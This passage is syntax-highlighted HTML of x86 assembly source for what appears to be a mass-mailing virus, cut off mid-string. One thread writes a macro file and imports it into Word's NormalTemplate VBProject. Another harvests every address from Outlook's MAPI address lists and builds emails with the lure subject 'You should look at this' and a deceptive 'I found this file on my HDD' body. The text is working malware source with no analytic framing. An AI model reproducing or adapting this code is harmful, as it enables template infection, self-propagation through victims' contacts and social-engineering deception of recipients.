    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">cdq</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">tmp2</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">end_wm_macro</span><span class="sc4">-</span><span class="sc5">wm_macro</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">wm_macro</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">WriteFile</span><span class="sc0">           </span><span class="sc1">;write there macro script</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">end_tw</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">CloseHandle</span><span class="sc0">         </span><span class="sc1">;and close file</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">winword_dispatcher</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">winword_interface</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;IUnknown::QueryInterface</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">end_tw</span><span class="sc0">

        </span><span class="sc1">;NormalTemplate.VBProject.VBComponents.Import("c:\io.sy0")</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">hEvent</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">WaitForSingleObject</span><span class="sc0">     </span><span class="sc1">;synchronization with 2nd thread</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">8</span><span class="sc0">               </span><span class="sc1">;.NormalTemplate</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DispInvoke_Get</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">end_tw</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">63h</span><span class="sc0">             </span><span class="sc1">;.VBProject</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DispInvoke_Get</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">end_tw</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">87h</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DispInvoke_Get</span><span class="sc0">          </span><span class="sc1">;.VBComponents</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">end_tw</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">             </span><span class="sc1">;EDI = .VBComponents</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0Ah</span><span class="sc0">             </span><span class="sc1">;.Count</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DispInvoke_Get</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">end_tw</span><span class="sc0">

    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dispatcher_params.Argument_Count</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dispatcher_params.Arguments</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">variant_argument</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">argument_union</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@imp</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0Dh</span><span class="sc0">             </span><span class="sc1">;.Import</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DispInvoke</span><span class="sc0">

</span><span class="sc5">end_tw</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">@SEH_RemoveFrame</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">hEvent</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">SetEvent</span><span class="sc0">            </span><span class="sc1">;synchronization with 2nd thread</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">ExitThread</span><span class="sc0">          </span><span class="sc1">;terminate thread</span><span class="sc0">
</span><span class="sc5">Thread_Word</span><span class="sc0"> </span><span class="sc9">EndP</span><span class="sc0">



</span><span class="sc5">to_wait</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1000</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">Sleep</span><span class="sc0">               </span><span class="sc1">;wait 1 second</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">to_go</span><span class="sc0">

</span><span class="sc5">Thread_Outlook</span><span class="sc0">  </span><span class="sc9">Proc</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc5">@SEH_SetupFrame</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">end_tw</span><span class="sc4">&gt;</span><span class="sc0">

</span><span class="sc5">to_go</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">outlook_object</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">outlook_CLSID</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">GetActiveObject</span><span class="sc0">         </span><span class="sc1">;look out if outlook is active</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">to_wait</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">outlook_dispatcher</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">outlook_interface</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;IUnknown::QueryInterface</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">end_tw</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">o_if</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">hEvent</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">WaitForSingleObject</span><span class="sc0">     </span><span class="sc1">;synchronization with 1st thread</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@mapi</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc12">'M'</span><span class="sc4">,</span><span class="sc12">'A'</span><span class="sc4">,</span><span class="sc12">'P'</span><span class="sc4">,</span><span class="sc12">'I'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@mapi</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">argument_union</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc1">;set mapi = Outlook.GetNameSpace("MAPI")</span><span class="sc0">

    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dispatcher_params.Argument_Count</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dispatcher_params.Arguments</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">variant_argument</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">110h</span><span class="sc0">            </span><span class="sc1">;.GetNamespace</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DispInvoke</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">end_tw</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">             </span><span class="sc1">;EDI = mapi</span><span class="sc0">

    </span><span class="sc1">;mapi.AddressLists.Count</span><span class="sc0">

    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dispatcher_params.Argument_Count</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">210Dh</span><span class="sc0">           </span><span class="sc1">;.AddressLists</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DispInvoke_Get</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">end_tw</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">50h</span><span class="sc0">             </span><span class="sc1">;.Count</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DispInvoke</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">end_tw</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc5">@l1</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">pushad</span><span class="sc0">

    </span><span class="sc1">;set a = mapi.AddressLists(i)</span><span class="sc0">

    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dispatcher_params.Argument_Count</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dispatcher_params.Arguments</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dword_argument</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">esp.Pushad_ecx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dword_union</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">210Dh</span><span class="sc0">           </span><span class="sc1">;.AddressLists</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DispInvoke</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">             </span><span class="sc1">;EDI = a</span><span class="sc0">

    </span><span class="sc1">;a.AddressEntries.Count</span><span class="sc0">

    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dispatcher_params.Argument_Count</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">            </span><span class="sc1">;.AddressEntries</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DispInvoke_Get</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">address_entries</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">50h</span><span class="sc0">             </span><span class="sc1">;.Count</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DispInvoke</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc5">@l2</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">pushad</span><span class="sc0">

    </span><span class="sc1">;a.AddressEntries.Item(x).Address</span><span class="sc0">

    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dispatcher_params.Argument_Count</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dispatcher_params.Arguments</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dword_argument</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">esp.Pushad_ecx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dword_union</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">address_entries</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">51h</span><span class="sc0">             </span><span class="sc1">;.Item</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DispInvoke</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dispatcher_params.Argument_Count</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">3003h</span><span class="sc0">           </span><span class="sc1">;.Address</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DispInvoke</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">             </span><span class="sc1">;EDI = address</span><span class="sc0">

    </span><span class="sc1">;Set newMail = Outlook.CreateItem(0)</span><span class="sc0">

    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dispatcher_params.Argument_Count</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">tmp</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dispatcher_params.Arguments</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">tmp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">10Ah</span><span class="sc0">            </span><span class="sc1">;.CreateItem</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">o_if</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DispInvoke_Get</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">             </span><span class="sc1">;ESI = new email object</span><span class="sc0">

    </span><span class="sc1">;newMail.Recipients.Add (address)</span><span class="sc0">

    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dispatcher_params.Argument_Count</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">0F814h</span><span class="sc0">          </span><span class="sc1">;.Recipients</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DispInvoke_Get</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dispatcher_params.Argument_Count</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dispatcher_params.Arguments</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">variant_argument</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">argument_union</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">6Fh</span><span class="sc0">             </span><span class="sc1">;.Add</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DispInvoke</span><span class="sc0">

    </span><span class="sc1">;newMail.Subject = "You should look at this"</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@subj</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc12">'y'</span><span class="sc4">,</span><span class="sc12">'o'</span><span class="sc4">,</span><span class="sc12">'u'</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc4">,</span><span class="sc12">'s'</span><span class="sc4">,</span><span class="sc12">'h'</span><span class="sc4">,</span><span class="sc12">'o'</span><span class="sc4">,</span><span class="sc12">'u'</span><span class="sc4">,</span><span class="sc12">'l'</span><span class="sc4">,</span><span class="sc12">'d'</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc4">,</span><span class="sc12">'l'</span><span class="sc4">,</span><span class="sc12">'o'</span><span class="sc4">,</span><span class="sc12">'o'</span><span class="sc4">,</span><span class="sc12">'k'</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc4">,</span><span class="sc12">'a'</span><span class="sc4">,</span><span class="sc12">'t'</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc12">'t'</span><span class="sc4">,</span><span class="sc12">'h'</span><span class="sc4">,</span><span class="sc12">'i'</span><span class="sc4">,</span><span class="sc12">'s'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@subj</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">argument_union</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">37h</span><span class="sc0">             </span><span class="sc1">;.Subject</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DispInvoke_Put</span><span class="sc0">

    </span><span class="sc1">;newMail.Body = "Hello," &amp; vbCrLf &amp; "I found this file on my HDD and it</span><span class="sc0">
    </span><span class="sc1">;seems it's yours. Please have a look at it and give me know." &amp; vbCrLf</span><span class="sc0">
    </span><span class="sc1">;&amp; "Thank you."</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@body</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc12">'H'</span><span class="sc4">,</span><span class="sc12">'e'</span><span class="sc4">,</span><span class="sc12">'l'</span><span class="sc4">,</span><span class="sc12">'l'</span><span class="sc4">,</span><span class="sc12">'o'</span><span class="sc4">,</span><span class="sc12">','</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc4">,</span><span class="sc12">'I'</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc4">,</span><span class="sc12">'f'</span><span class="sc4">,</span><span class="sc12">'o'</span><span class="sc4">,</span><span class="sc12">'u'</span><span class="sc4">,</span><span class="sc12">'n'</span><span class="sc4">,</span><span class="sc12">'d'</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc12">'t'</span><span class="sc4">,</span><span class="sc12">'h'</span><span class="sc4">,</span><span class="sc12">'i'</span><span class="sc4">,</span><span class="sc12">'s'</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc4">,</span><span class="sc12">'f'</span><span class="sc4">,</span><span class="sc12">'i'</span><span class="sc4">,</span><span class="sc12">'l'</span><span class="sc4">,</span><span class="sc12">'e'</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc4">,</span><span class="sc12">'o'</span><span class="sc4">,</span><span class="sc12">'n'</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc4">,</span><span class="sc12">'m'</span><span class="sc4">,</span><span class="sc12">'y'</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc12">'H'</span><span class="sc4">,</span><span class="sc12">'D'</span><span class="sc4">,</span><span class="sc12">'D'</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc4">,</span><span class="sc12">'a'</span><span class="sc4">,</span><span class="sc12">'n'</span><span class="sc4">,</span><span class="sc12">'d'</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc4">,</span><span class="sc12">'i'</span><span class="sc4">,</span><span class="sc12">'t'</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc4">,</span><span class="sc12">'s'</span><span class="sc4">,</span><span class="sc12">'e'</span><span class="sc4">,</span><span class="sc12">'e'</span><span class="sc4">,</span><span class="sc12">'m'</span><span class="sc4">,</span><span class="sc12">'s'</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc12">' '</span><span class="sc4">,</span><span class="sc12">'i'</span><span class="sc4">,</span><span class="sc12">'t'</span><span class="sc4">,</span><span class="sc12">''''</span><span class="sc4">,</span><span class="sc12">'s'</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc4">,</span><span class="sc12">'y'</span><span class="sc4">,</span><span class="sc12">'o'</span><span class="sc4">,</span><span class="sc12">'u'</span><span class="sc4">,</span><span class="sc12">'r'</span><span class="sc4">,</span><span class="sc12">'s'</span><span class="sc4">,</span><span class="sc12">'.'</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc4">,</span><span class="sc12">'P'</span><span class="sc4">,</span><span class="sc12">'l'</span><span class="sc4">,</span><span class="sc12">'e'</span><span class="sc0">
